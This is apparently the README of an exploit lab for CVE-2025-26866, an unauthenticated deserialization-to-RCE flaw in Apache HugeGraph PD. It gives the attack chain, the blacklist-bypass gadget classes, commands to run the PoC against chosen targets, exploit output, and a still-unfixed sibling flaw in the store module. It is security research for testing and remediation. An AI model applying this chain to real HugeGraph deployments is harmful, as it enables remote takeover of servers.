# CVE-2025-26866 - Apache HugeGraph PD Insecure Hessian Deserialization to RCE

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-26866 |
| Component | [Apache HugeGraph](https://github.com/apache/incubator-hugegraph) — `hugegraph-pd` (Placement Driver) |
| Type | CWE-502: Deserialization of Untrusted Data |
| CVSS | 8.8 (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 1.3% (79.2nd percentile) |
| Affected | Apache HugeGraph 1.0.0 – 1.5.0 |
| Fix | HugeGraph [v1.7.0](https://github.com/apache/incubator-hugegraph/pull/2735) |
| Author | Exploit Intelligence Platform |
| Date | 2025-12-12 |

## Vulnerability Details

CVE-2025-26866 is an insecure Hessian2 deserialization vulnerability in Apache HugeGraph's Placement Driver (PD) component. The PD uses SOFAJRaft for Raft consensus cluster coordination, and the Raft RPC layer uses the SOFABolt binary TCP protocol on port 8610.

The `KVOperation.fromByteArray()` method calls `Hessian2Input.readObject()` on the `arg` field **without any class whitelist or `SerializerFactory`**. Combined with the fact that the Raft RPC port accepts connections from **any IP address** (no authentication), any network attacker who can reach port 8610 can send crafted Hessian2-serialized payloads containing Java gadget chains, leading to unauthenticated Remote Code Execution.

### Vulnerable Code

```java
// KVOperation.java — line 91
public static KVOperation fromByteArray(byte[] value) throws IOException {
    try (ByteArrayInputStream bis = new ByteArrayInputStream(value, 1, value.length - 1)) {
        Hessian2Input input = new Hessian2Input(bis);
        // BUG: No SerializerFactory — any class can be deserialized
        KVOperation op = new KVOperation();
        op.op = value[0];
        op.key = input.readBytes();
        op.value = input.readBytes();
        op.arg = input.readObject();   // ← arbitrary object deserialization
        input.close();
        return op;
    }
}
```

### Attack Chain

```
1. Connect to the PD Raft RPC port (8610) using SOFABolt V1 protocol
2. Send an RPC request with className matching a registered UserProcessor
3. Content contains sofa-hessian encoded ProxyLazyValue gadget chain
4. KVOperation.fromByteArray() → Hessian2Input.readObject() deserializes payload
5. TreeMap.put() triggers RdnEntry.compareTo() → UIDefaults.get() → ProxyLazyValue.createValue()
6. ProxyLazyValue invokes Constructor.newInstance() → arbitrary code execution
```

### Blacklist Bypass

sofa-hessian 3.3.6 (shipped with HugeGraph PD 1.5.0) includes a `NameBlackListFilter` blocking common gadget classes (`TemplatesImpl`, `JdbcRowSetImpl`, etc.). This PoC bypasses the blacklist using the CVE-2024-46983 technique — JDK-only classes not present in the 3.3.6 blacklist:

- `javax.naming.ldap.Rdn$RdnEntry`
- `javax.swing.UIDefaults`
- `javax.swing.UIDefaults$ProxyLazyValue`

These classes were added to the blacklist in sofa-hessian 3.5.5, but HugeGraph PD 1.5.0 ships with 3.3.6.

### Fix

The fix ([PR #2735](https://github.com/apache/incubator-hugegraph/pull/2735), merged April 2025, released as v1.7.0) adds two defense layers:

1. **Hessian deserialization whitelist** — New `HugegraphHessianSerializerFactory` with a strict allowlist of ~40 classes applied to `Hessian2Input` in `KVOperation.fromByteArray()`
2. **IP-based authentication** — New `IpAuthHandler` (Netty `ChannelDuplexHandler`) restricts Raft RPC connections to only IPs from the configured peer list

**Note:** The `hugegraph-store` module has an identical vulnerability in `RaftOperation.toObject()` on port 8510 that was **not fixed** by this patch.

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────────────────┐
│  cve-2025-26866-vulnerable                           │
│  Eclipse Temurin JRE 11 + HugeGraph PD v1.5.0       │
│  Raft RPC (SOFABolt) on port 8610 — attack surface   │
│  REST API on port 8620 — health check                │
│  gRPC on port 8686 — control plane                   │
│  Port 8610 (host: 8610), 8620 (host: 8620)          │
└──────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-26866

# Build (multi-stage Maven build — takes ~5 minutes)
docker compose build

# Start
docker compose up -d

# Run the exploit
python3 poc/poc.py --target localhost --port 8610

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2025-26866-vulnerable` | HugeGraph PD | `eclipse-temurin:11-jre-jammy` | `8610`, `8620` | Single-node PD with SOFABolt Raft RPC (v1.5.0, vulnerable) |

### Service Ports

| Port | Protocol | Service | Role |
|---|---|---|---|
| **8610** | SOFABolt (TCP) | PD Raft RPC | **Attack surface** — Hessian deserialization target |
| 8620 | HTTP | PD REST API | Health check (`/actuator/health`) |
| 8686 | gRPC | PD gRPC | Control plane |

### Credentials

| Service | Username | Password |
|---|---|---|
| PD Raft RPC | N/A | No authentication (pre-auth attack) |

## PoC Usage

The PoC is a pure Python 3 script with **no external dependencies** (stdlib only). It implements a custom sofa-hessian wire format writer and SOFABolt V1 protocol framer from scratch.

### `poc.py` — Hessian Deserialization RCE

Sends a crafted ProxyLazyValue gadget chain payload via SOFABolt V1 to the PD Raft RPC port, creating a marker file on the target as proof of code execution.

```bash
# Default (localhost:8610)
python3 poc/poc.py --target localhost --port 8610

# Custom target
python3 poc/poc.py --target 10.0.0.1 --port 8610

# Custom marker file
python3 poc/poc.py --target localhost --port 8610 --marker /tmp/pwned

# Skip Docker-based verification
python3 poc/poc.py --target localhost --port 8610 --skip-verify
```

### Expected Output (Vulnerable)

```
=================================================================
 CVE-2025-26866: Apache HugeGraph PD
 Insecure Hessian Deserialization in Raft RPC -> RCE
 Blacklist bypass via CVE-2024-46983 (ProxyLazyValue)
=================================================================

[*] Sending heartbeat to localhost:8610...
[+] Heartbeat SUCCESS - target is alive

[*] Cleaning up any existing marker file...

[EXPLOIT] ProxyLazyValue blacklist bypass (CVE-2024-46983)
=================================================================
[*] Target: localhost:8610
[*] Marker file: /tmp/hugegraph_rce_proof
[*] Chain: TreeMap -> RdnEntry.compareTo -> UIDefaults.get -> ProxyLazyValue.createValue
[*] Sink: new FileOutputStream("/tmp/hugegraph_rce_proof")

[*] Building sofa-hessian payload with ProxyLazyValue gadget chain...
[*] Hessian2 payload: 259 bytes

[*] Wrapping in SOFABolt V1 frame...
[*] className: org.apache.hugegraph.pd.raft.RaftRpcProcessor$GetMemberRequest
[*] Total frame: 343 bytes

[*] Sending exploit to localhost:8610...
[*] Response: 1318 bytes
[*] Status: SERVER_DESERIAL_EXCEPTION (0x0012)

[*] Deserialization exception - chain may have triggered

[VERIFY] Checking for marker file in container...
[+] SUCCESS! Marker file exists:
    -rw-r--r-- 1 root root 0 Mar  1 12:08 /tmp/hugegraph_rce_proof

=================================================================
[+] RCE CONFIRMED - CVE-2025-26866 exploitation successful!
[+] Created file: /tmp/hugegraph_rce_proof on target
[+] Chain: SOFABolt RPC -> Hessian2 deser -> ProxyLazyValue -> FileOutputStream
[+] Impact: Unauthenticated Remote Code Execution
=================================================================
```

## Verification: Vulnerable vs Patched

| Test | Vulnerable (v1.5.0) | Patched (v1.7.0) |
|---|---|---|
| SOFABolt heartbeat | `SUCCESS` — alive | `SUCCESS` — alive |
| ProxyLazyValue gadget chain | **RCE CONFIRMED** — marker file created | `SecurityException: hessian serialize unauthorized class` |
| IP-based auth bypass | N/A — no auth | Connection rejected for non-peer IPs |

## Known Issues

1. **sofa-hessian custom wire format:** sofa-hessian 3.3.6 does NOT use standard Hessian 2.0 encoding. Tags like `C` (0x43), `H` (0x48), `Z` (0x5A), and compact encodings (0x60-0x6E) are not supported. The PoC implements a custom `SofaHessianWriter` class that speaks the sofa-hessian 3.3.6 format, reverse-engineered empirically.

2. **ClassCastException after RCE:** The server returns `SERVER_DESERIAL_EXCEPTION` (0x0012) after the gadget chain executes. This is expected — `UIDefaults` cannot be cast to `String` in `RdnEntry.getValueComparable()`, but the file creation side-effect has already occurred. The exception is cosmetic.

3. **Build time:** The Docker image builds HugeGraph from source via Maven, which takes approximately 5 minutes depending on network speed and whether Maven dependencies are cached.

4. **Unfixed store module:** The `hugegraph-store` module has the identical vulnerability in `RaftOperation.toObject()` on port 8510, which was NOT addressed by the v1.7.0 fix.

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary exploit — sofa-hessian ProxyLazyValue gadget chain via SOFABolt V1 |
| `Dockerfile.vulnerable` | Multi-stage Maven build → Eclipse Temurin 11 JRE runtime |
| `docker-compose.yml` | Lab orchestration — single HugeGraph PD container |
| `application.yml` | PD configuration with Raft on dynamic container IP |
| `entrypoint.sh` | Container startup — IP detection + PD launch |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis, fix assessment, and unfixed store module |
| `lab_build_report.md` | Lab construction documentation |
| `poc_verification_report.md` | Full test results with protocol details |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-26866)
- [Fix PR #2735](https://github.com/apache/incubator-hugegraph/pull/2735)
- [GHSA-q37j-3367-fwv7](https://github.com/advisories/GHSA-q37j-3367-fwv7)
- [Apache Mailing List](https://lists.apache.org/thread/ko8jkwbjbb99m45pg4sgo5xsm8gx9nsq)
- [oss-security Disclosure](http://www.openwall.com/lists/oss-security/2025/12/09/1)

## Timeline

| Date | Event |
|---|---|
| 2025-04-02 | Fix PR #2735 merged |
| 2025-12-09 | Disclosed on oss-security mailing list |
| 2025-12-12 | CVE-2025-26866 published; HugeGraph v1.7.0 released with fix |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-26866 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
